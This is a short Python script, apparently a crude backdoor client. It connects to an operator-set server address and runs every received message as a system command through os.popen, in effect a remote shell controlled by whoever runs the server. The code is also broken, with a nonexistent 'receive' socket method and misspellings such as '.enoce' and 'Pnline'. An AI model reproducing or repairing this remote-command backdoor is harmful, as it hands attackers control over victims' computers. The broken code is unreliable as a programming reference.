import socket
import os

server = socket.socket()
host = '127.0.0.1'  # Your server ip
port = 1234  #Data Port

run = True
server.connect((host,port))

while run:
    msg = server.receive(1024)
    os.popen(msg.decode('UTF-8'))  #running in cmd

    server.send('Client Pnline ...'.enoce('UTF-8'))
